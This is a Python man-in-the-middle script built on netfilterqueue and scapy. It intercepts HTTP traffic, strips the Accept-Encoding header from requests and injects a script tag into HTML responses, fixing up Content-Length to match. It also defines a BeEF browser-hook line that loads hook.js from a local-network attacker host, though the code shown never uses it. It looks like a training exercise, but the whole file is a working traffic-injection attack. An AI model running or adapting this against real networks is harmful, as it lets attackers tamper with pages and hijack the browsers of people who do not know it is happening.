#!/usr/bin/env python3
# Rebuild - uncommented
import netfilterqueue
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import Raw
import re

AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
replace_load = ""
ContentLengthRegex = "(?:Content-Length:\s)(\d*)"
injection_code = "<script>alert('Test!'); </script>"
beef_injection_code = '<script src="http://192.168.63.139:3000/hook.js"></script>'

def set_load(packet, load):
    packet[Raw].load = load
    del packet[IP].chksum
    del packet[TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet= IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        try:
            load = scapy_packet[Raw].load.decode()

            if scapy_packet.haslayer(TCP) and scapy_packet[TCP].dport == 80:
                print("[+] HTTP Request Intercepted:  ")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet.haslayer(TCP) and scapy_packet[TCP].sport == 80:
                print("[+] HTTP Response Intercepted:  ")
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

                if load != scapy_packet[Raw].load:
                    new_packet = set_load(scapy_packet, load)
                    packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass

    packet.accept()


if __name__ == "__main__":
    try:
        print("[*] Initializing NetfilterQueue...")
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Unbinding queue and exiting...")
